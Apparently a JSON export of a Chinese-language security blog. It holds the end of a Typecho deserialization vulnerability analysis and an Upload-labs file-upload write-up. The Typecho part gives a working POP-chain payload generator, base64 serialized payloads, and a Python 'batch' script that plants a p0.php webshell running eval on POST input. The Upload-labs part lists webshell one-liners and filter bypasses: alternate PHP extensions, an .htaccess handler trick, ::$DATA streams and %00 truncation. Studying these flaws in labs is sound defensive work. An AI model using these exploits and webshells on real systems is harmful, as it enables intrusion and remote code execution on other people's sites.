//self&#x662F;&#x5F15;&#x7528;&#x9759;&#x6001;&#x7C7B;&#x7684;&#x7C7B;&#x540D;&#xFF0C;&#x800C;$this&#x662F;&#x5F15;&#x7528;&#x975E;&#x9759;&#x6001;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x540D;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#x5C06;RSS2&#x7684;&#x503C;&#x8D4B;&#x503C;&#x7ED9;$this-&gt;_type&#x3002; $item[&apos;link&apos;] = &apos;1&apos;; $item[&apos;title&apos;] = &apos;2&apos;; $item[&apos;date&apos;] = 1507720298; $item[&apos;author&apos;] = new Typecho_Request(); //&apos;author&apos;&#x91CC;&#x9762;&#x5305;&#x542B;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x6CA1;&#x6709;sreenName&#x5C5E;&#x6027;&#x624D;&#x80FD;&#x51FA;&#x53D1;_get()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; $item[&apos;category&apos;] = array(new Typecho_Request()); //&#x770B;&#x5230;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x8BF4;&#x8FD9;&#x6761;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x7684;&#xFF0C;&#x539F;&#x8BDD;&#x662F;&#xFF1A;&#x201C;&apos;category&apos; &#x7528;&#x4E8E;&#x5206;&#x652F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x7528;&#x4E8E;&#x56DE;&#x663E;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x201D;&#x4F46;&#x662F;&#x7701;&#x7565;&#x4E86;&#x4E4B;&#x540E;&#x548C;&#x4E0A;&#x9762;link&#x7B49;&#x533B;&#x9662;&#x7684;&#x4F1A;&#x62A5;&#x9519;&#x3002;&#xFF01; //&#x5206;&#x6790;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#xFF0C;&#x5E76;&#x4E0D;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;link&#xFF0C;title&#xFF0C;date&#x662F;&#x627E;&#x5230;&#x9700;&#x8981;&#x88AB;&#x8D4B;&#x4E88;&#x7684;&#x503C;&#x7684;&#xFF0C;&#x7F3A;&#x5C11;&#x4E00;&#x4E2A;&#x90FD;&#x4E0D;&#x884C;&#xFF0C;&#x9875;&#x9762;&#x90FD;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x3002; $this-&gt;_items[0] = $item; }}$a = new Typecho_Feed(); //&#x8FD9;&#x91CC;&#x5B9E;&#x4F8B;&#x4E86;Typecho_Feed()&#x5BF9;&#x8C61;&#x3002;$exp = array( &apos;adapter&apos; =&gt; $a, //&#x8FD9;&#x91CC;&#x5C06;adapter&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x624D;&#x80FD;&#x51FA;&#x53D1;__toString()&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x3002; &apos;prefix&apos; =&gt; &apos;typecho_&apos; //&#x8FD9;&#x91CC;&#x7701;&#x7565;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;phpinfo&#xFF0C;&#x4F46;&#x662F;PHP&#x4F1A;&#x62A5;&#x9519;&#x3002;);echo base64_encode(serialize($exp));?&gt; &#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;&#x5728;&#x706B;&#x72D0;&#x6D4F;&#x89C8;&#x5668;&#x6253;&#x5F00;&#xFF1A;http://localhost/install.php &#x6253;&#x5F00;HackBar&#xFF1A; &#x7F51;&#x5740;&#x4E3A;&#xFF1A;http://localhost/install.php?finish=a POST&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;__typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9 Referrer=http://localhost/install.php &#x53D1;&#x9001;POST&#x5373;&#x53EF;&#x770B;&#x5230;&#x7F51;&#x9875;&#x6267;&#x884C;&#x4E86;&lt;?php phpinfo(); ?&gt; &#x5373;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6210;&#x529F;&#xFF01; &#x53C2;&#x8003; https://www.freebuf.com/vuls/152058.html https://www.freebuf.com/vuls/155753.html https://paper.seebug.org/424/ http://www.blogsir.com.cn/safe/454.html //&#x4ECA;&#x5929;&#x7A81;&#x7136;&#x6253;&#x4E0D;&#x5F00;&#x4E86;&#x3002; POP&#x94FE;&#x548C;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C; - rivir-&#x6C5F;sir //&#x4E5F;&#x662F;&#x6253;&#x4E0D;&#x5F00;&#xFF01; &#x5176;&#x4ED6;call_user_func &#xFF08;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8C03;&#x7528;&#xFF09;&lt;?php function barber($type){ //&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;barber echo &quot;you wanted a $type haircut, no problem\\n&quot;; } call_user_func(&apos;barber&apos;,&apos;mushroom&apos;); //&#x5C06;&#x51FD;&#x6570;barber&#x7684;&#x51FD;&#x6570;&#x540D;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF01;&#x540E;&#x9762;&#x4E3A;&#x8F93;&#x5165;&#x7684;&#x503C;&#xFF01; ?&gt; &#x901A;&#x8FC7;&#x7C7B;&#x540D;&#x3001;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x56DE;&#x8C03; &lt;?php /** * &#x7528;call_user_func()&#x6765;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5; */ class myclass{ //&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x7C7B; static function say_hello(){ //&#x5728;&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570; echo &quot;hello!\\n&quot;; } } $classname = &quot;myclass&quot;; //&#x901A;&#x8FC7;&#x6570;&#x7EC4;&#x952E;&#x503C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5BF9;&#x7C7B;&#x540D;&#x8FDB;&#x884C;&#x56DE;&#x8C03;&#xFF0C;&#x56DE;&#x8C03;&#x7C7B;&#x540D;&#x91CC;&#x9762;&#x7684;&#xFF0C;say_hello&#x65B9;&#x6CD5; call_user_func(array($classname,&apos;say_hello&apos;)); //&#x901A;&#x8FC7;&#x7C7B;&#x540D;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x9759;&#x6001;&#x65B9;&#x6CD5; call_user_func($classname .&apos;::say_hello&apos;); // As of 5.2.3// $myobject = new myclass(); //&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x56DE;&#x8C03; $myobject = new myclass(); call_user_func(array($myobject, &apos;say_hello&apos;)); ?&gt; array_map() &#xFF08;&#x51FD;&#x6570;&#x5C06;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x540E;&#x7684;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002;&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A; &#x5C06;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x503C;&#x4E0A;&#xFF0C;&#x6BCF;&#x4E2A;&#x503C;&#x90FD;&#x4E58;&#x4EE5;&#x672C;&#x8EAB;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x5E26;&#x6709;&#x65B0;&#x503C;&#x7684;&#x6570;&#x7EC4;&#x3002; &lt;?php function myfunction($v) { return($v*$v); } $a=array(1,2,3,4,5); print_r(array_map(&quot;myfunction&quot;,$a)); ?&gt; &#x53C2;&#x8003;&#xFF1A;http://www.w3school.com.cn/php/func_array_map.asp pop&#x94FE;&#x7684;&#x5229;&#x7528;&#x4EE5;&#x524D;&#x7406;&#x89E3;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x3002; &#x4F46;&#x5982;&#x679C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x4E0D;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x7C7B;&#x7684;&#x666E;&#x901A;&#x65B9;&#x6CD5;&#x4E2D;&#x3002;&#x8FD9;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x76F8;&#x540C;&#x7684;&#x51FD;&#x6570;&#x540D;&#x5C06;&#x7C7B;&#x7684;&#x5C5E;&#x6027;&#x548C;&#x654F;&#x611F;&#x51FD;&#x6570;&#x7684;&#x5C5E;&#x6027;&#x8054;&#x7CFB;&#x8D77;&#x6765;&#x3002; &#x628A;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x5C0F;&#x7EC4;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4E2D;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x51FD;&#x6570;(&#x5C0F;&#x7EC4;&#x4EF6;)&#xFF0C;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x76F8;&#x540C;&#x540D;&#x5B57;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x518D;&#x4E0E;&#x7C7B;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x51FD;&#x6570;&#x548C;&#x5C5E;&#x6027;&#x76F8;&#x5173;&#x8054;&#xFF0C;&#x5C31;&#x662F;POP CHAIN &#x3002;&#x6B64;&#x65F6;&#x7C7B;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x654F;&#x611F;&#x5C5E;&#x6027;&#x90FD;&#x5C5E;&#x4E8E;&#x53EF;&#x63A7;&#x7684;&#x3002;&#x5F53;unserialize()&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x63A7;&#x5236;POP CHAIN&#x8FBE;&#x5230;&#x5229;&#x7528;&#x7279;&#x5B9A;&#x6F0F;&#x6D1E;&#x7684;&#x6548;&#x679C;&#x3002; &#x6279;&#x91CF;&#x6253;12345678910111213141516171819202122232425import requestsdef poc(url): url = url if url.startswith(&apos;http://&apos;) else &apos;http://&apos;+url print url target = url+&apos;/install.php?finish&apos; headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;, &apos;Referer&apos;:&apos;http://localhost:85/install.php&apos;, &apos;cookie&apos;:&quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot; } try: html = requests.get(url=target,headers=headers,timeout=3) if html.status_code == 404: return &apos;the file install.php is not exists&apos; print &apos;shell:&apos;, url+&apos;p0.php&apos; except Exception ,e: print e return Falseif __name__ == &apos;__main__&apos;: url = &apos;http://localhost:85/&apos; poc(url)","link":"/2018/01/01/Typecho反序列化漏洞分析/"},{"title":"Upload-labs-Writeup","text":"Upload-labs &#x9879;&#x76EE;&#x5730;&#x5740; &#x57FA;&#x7840;&#x77E5;&#x8BC6;&#x9776;&#x673A;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;&#x5206;&#x7C7B; &#x5982;&#x4F55;&#x5224;&#x65AD;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x7C7B;&#x578B; UploadPass-01&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;&#x4E86;&#x4E00;&#x4E2A;PHP&#xFF0C;&#x53CD;&#x5E94;&#x5F88;&#x5FEB;&#x5F39;&#x51FA;&#x683C;&#x5F0F;&#x8981;&#x6C42;&#x7A97;&#x53E3;&#x3002;&#x518D;&#x6839;&#x636E;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x5224;&#x65AD;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4F7F;&#x7528;&#x4E86;JS&#x5224;&#x65AD;&#x3002; &#x7528;Brupsuite&#x6293;&#x5305; &#x7136;&#x540E;&#x5C06;filename&#x4FEE;&#x6539;&#x4E3A;&#x201C;shell.php&#x201D; &#x5728;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x91CC;&#x6DFB;&#x52A0;&lt;?php eval($_POST[three])?&gt; &#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#x63A5; &#x8FD9;&#x4E2A;&#x9664;&#x4E86;js&#x4E4B;&#x5916;&#x90FD;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x68C0;&#x67E5;&#x3002; Pass-02&#x548C;&#x7B2C;&#x4E00;&#x5173;&#x4E00;&#x6837;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E2A;php&#x540E;&#xFF0C;&#x63D0;&#x793A;&#xFF1A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x8BF7;&#x91CD;&#x65B0;&#x4E0A;&#x4F20;&#xFF01; &#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x76F8;&#x5173;&#x7684;JS&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x662F;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x68C0;&#x67E5;&#x3002; &#x548C;&#x7B2C;&#x4E00;&#x5173;&#x4E00;&#x6837;&#x7684;&#x6B65;&#x9AA4;&#x3002; &#x7528;Brupsuite&#x6293;&#x5305; &#x7136;&#x540E;&#x5C06;filename&#x4FEE;&#x6539;&#x4E3A;&#x201C;shell.php&#x201D; &#x5728;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x91CC;&#x6DFB;&#x52A0;&lt;?php eval($_POST[three])?&gt; &#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#x63A5; &#x770B;&#x4E86;&#x6E90;&#x7801;&#x540E;&#x53D1;&#x73B0;&#xFF1A; if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#x5B83;&#x53EA;&#x5224;&#x65AD;&#x4E86;&#x6570;&#x636E;&#x5305;&#x7684;MIME&#x3002;&#x5374;&#x6CA1;&#x6709;&#x5BF9;&#x540E;&#x7F00;&#x540D;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x3002; Pass-03&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;php&#xFF0C;&#x63D0;&#x793A;&#xFF1A;&#x4E0D;&#x5141;&#x8BB8;&#x4E0A;&#x4F20;.asp,.aspx,.php,.jsp&#x540E;&#x7F00;&#x6587;&#x4EF6;&#xFF01; &#x5C5E;&#x4E8E;&#x9ED1;&#x540D;&#x5355;&#x7C7B;&#x578B;&#x3002; &#x8FD9;&#x91CC;&#x9700;&#x8981;&#x4E0A;&#x4F20;&#x7279;&#x6B8A;&#x53EF;&#x89E3;&#x6790;&#x540E;&#x7F00;&#xFF0C; &#x4F8B;&#x5982;.phtml &#x6216;&#x8005; .php2 &#x4E24;&#x79CD;&#x7C7B;&#x578B;&#x90FD;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x88AB;&#x89E3;&#x6790;&#x3002; &#x53EF;&#x80FD;&#x662F;&#x7531;&#x4E8E;&#x6211;&#x914D;&#x7F6E;&#x7684;&#x7F18;&#x6545;&#xFF0C;&#x6CA1;&#x6709;&#x6210;&#x529F;&#x88AB;&#x89E3;&#x6790;&#x3002;orz&#xFF0C;&#x4E0D;&#x6562;&#x518D;&#x7EE7;&#x7EED;&#x914D;&#x7F6E;&#x4E0B;&#x53BB;&#x4E86;&#x3002; &#x8FD9;&#x91CC;&#x6536;&#x96C6;&#x4E86;&#x4E00;&#x4E9B;&#x53EF;&#x88AB;PHP&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x6267;&#x884C;&#x7684;&#x540E;&#x7F00;&#x540D;&#xFF1A; .php*&#x7C7B;: .php. ubuntu 12.04 lts LAMP bypass with .php. .php3 .php4 .php5 .php6 .php7 .ph*&#x7C7B; .pht .phtm .phtml &#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7C7B; .php.gif .jpg%00.php Pass-04&#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x540E;&#x7F00;&#x540D;&#xFF0C;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#x3002; &#x67E5;&#x770B;&#x4E86;&#x63D0;&#x793A;&#x4E4B;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x9ED1;&#x540D;&#x5355;&#x5217;&#x4E3E;&#x4E86;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x3002; &#x5C1D;&#x8BD5;&#x4E0A;&#x4F20;.htaccess&#x6587;&#x4EF6;&#xFF1F; 123&lt;FilesMatch &quot;evil.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; &#x53EF;&#x4EE5;&#x5C06;evil.jpg&#x6587;&#x4EF6;&#x89E3;&#x6790;&#x4E3A;php &#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A; &#x4E0A;&#x4F20;&#x4E00;&#x4E2A;evil.php:.jpg&#x6587;&#x4EF6;&#xFF0C;&#x4E0A;&#x4F20;&#x76EE;&#x5F55;&#x4E0B;&#x4F1A;&#x5B58;&#x5728;&#x4E00;&#x4E2A;evil.php&#x7684;&#x7A7A;&#x6587;&#x4EF6; &#x4E0A;&#x4F20;&#x4E00;&#x4E2A;evil.&lt;&#x6216;evil.&lt;&lt;&lt;&#x6216;evil.&gt;&gt;&gt;&#x6216;evil.&gt;&gt;&lt;&#x540E;&#x518D;&#x6B21;&#x4E0A;&#x4F20;&#xFF0C;&#x91CD;&#x5199;evil.php &#x83DC;&#x5200;&#x94FE;&#x63A5; Pass-05&#x4F1A;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x7528;&#x7B2C;&#x56DB;&#x5173;&#x7684;&#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x6CD5;&#x3002; &#x8FD9;&#x91CC;&#x5F97;&#x7528;&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;.PHp&#x6216;&#x8005;&#x5176;&#x4ED6;&#x540D;&#x79F0;&#x90FD;&#x884C;&#x3002; Pass-06&#x589E;&#x52A0;&#x70B9;&#x548C;&#x7A7A;&#x683C;&#xFF0C;&#x5199;&#x6210; evil.php. &#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x53EA;&#x4F1A;&#x53D8;&#x6210;&#x6CA1;&#x6709;&#x540E;&#x7F00;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x53EF;&#x80FD;&#x53EA;&#x662F;&#x73AF;&#x5883;&#x7684;&#x95EE;&#x9898;&#x3002; Pass-07&#x7981;&#x6B62;&#x4E86;&#x4E00;&#x5207;&#x53EF;&#x6267;&#x884C;&#x7684;&#x540E;&#x7F00; &#x7528;&#x7B2C;6&#x9898;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;&#x540E;&#x7F00;&#x540D;&#x7684;&#x5730;&#x65B9;&#x52A0;&#x70B9;&#x3002; &#x5F88;&#x5947;&#x602A;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E2A;&#x5374;&#x6210;&#x529F;&#x5199;&#x5165;&#x4E86;&#xFF0C;&#x7B2C;&#x516D;&#x9898;&#x5374;&#x4E0D;&#x884C;&#x3002; &#x4ECE;&#x6E90;&#x7801;&#x6765;&#x770B;&#xFF1A; &#x7B2C;&#x516D;&#x9898;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;$file_name = deldot($file_name);//&#x5220;&#x9664;&#x6587;&#x4EF6;&#x540D;&#x672B;&#x5C3E;&#x7684;&#x70B9; &#x7B2C;&#x4E03;&#x9898;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x7528;&#x52A0;&#x70B9;&#x3002; Pass-08&#x4F7F;&#x7528;Windows&#x6587;&#x4EF6;&#x6D41;&#x7279;&#x6027;&#x7ED5;&#x8FC7; &#x6587;&#x4EF6;&#x540D;&#x6539;&#x6210; evil.php::$DATA &#x4E0A;&#x4F20;&#x540E;&#x7684;&#x56FE;&#x7247;&#x540D;&#x79F0;&#x4E3A;&#xFF1A;evil.php(&#x8FD9;&#x9898;&#x4F1A;&#x53D8;&#x6210;&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x540D;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x90FD;&#x662F;php) Pass-09&#x540C;&#x7B2C;6&#x5173;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x4E3A;&#xFF1A;evil.php. . &#x4E0A;&#x4F20;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x4E3A;php &#x4ECE;&#x6E90;&#x7801;&#x6765;&#x770B;&#xFF1A; &#x76F8;&#x6BD4;&#x7B2C;&#x516D;&#x5173;&#xFF0C;&#x591A;&#x4E86;&#x4E00;&#x4E2A;$file_ext = trim($file_ext); //&#x9996;&#x5C3E;&#x53BB;&#x7A7A; &#x5F53;. .&#x5148;&#x53BB;&#x4E86;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x518D;&#x9996;&#x5C3E;&#x53BB;&#x7A7A;&#xFF0C;&#x5C31;&#x548C;&#x7B2C;&#x4E03;&#x5173;&#x4E00;&#x6837;&#x53EA;&#x5269;&#x4E0B;&#x4E00;&#x4E2A;&#x70B9;&#x6210;&#x529F;&#x4E0A;&#x4F20;&#x3002; Pass-10&#x4ECE;&#x6E90;&#x7801;&#x4E0A;&#x770B;&#xFF0C;&#x4F1A;&#x5220;&#x9664;&#x9ED1;&#x540D;&#x5355;&#x7684;&#x5B58;&#x5728;&#x7684;&#x540E;&#x7F00;&#x3002;&#x53CC;&#x5199;&#x7ED5;&#x8FC7; &#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540D;&#x6539;&#x4E3A;&#xFF1A;evil.phphpp Pass-11&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x6BD4;&#x8F83;&#x9E21;&#x808B;&#x3002;&#x5229;&#x7528;&#x7684;&#x73AF;&#x5883;&#x5F97;&#x5148;&#x6709;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF1A; PHP&#x7248;&#x672C;&#x5C0F;&#x4E8E;5.3.4 PHP&#x7684;magic_quotes_gpc&#x4E3A;OFF&#x72B6;&#x6001; &#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;&#x662F;%00&#x622A;&#x65AD;&#x3002; &#x53EF;&#x77E5;&#xFF1A; &#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x7684;&#x8DEF;&#x5F84;&#x53EF;&#x63A7; &#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x63A7; &#x4E8E;&#x662F;&#x5728;&#x8DEF;&#x5F84;&#x5904;&#xFF0C;&#x5C06;../upload/&#x6539;&#x4E3A;&#xFF1A;../upload/evil.php%00 &#x6587;&#x4EF6;&#x540D;&#x4E3A;&#x6B63;&#x5E38;&#x7684;jpg&#x540E;&#x7F00;&#xFF0C;&#x4E0A;&#x4F20;&#x540E;&#x53EF;&#x5F97;&#x5230;&#xFF1A;../upload/evil.php &#x56E0;&#x4E3A;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x8BFB;&#x5230;%00&#x4F1A;&#x5F53;&#x505A;&#x7ED3;&#x675F;&#x7B26;&#x800C;&#x628A;&#x540E;&#x9762;&#x7684;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x5FFD;&#x7565;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x751F;&#x6210;&#x4E86;evil.php Pass-12&#x548C;11&#x5173;&#x4E00;&#x6837;&#x7684;&#x4F7F;&#x7528;&#x622A;&#x65AD;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x662F;&#x5229;&#x7528;Brupsuite&#x7684;Hex&#x529F;&#x80FD;&#x3002; 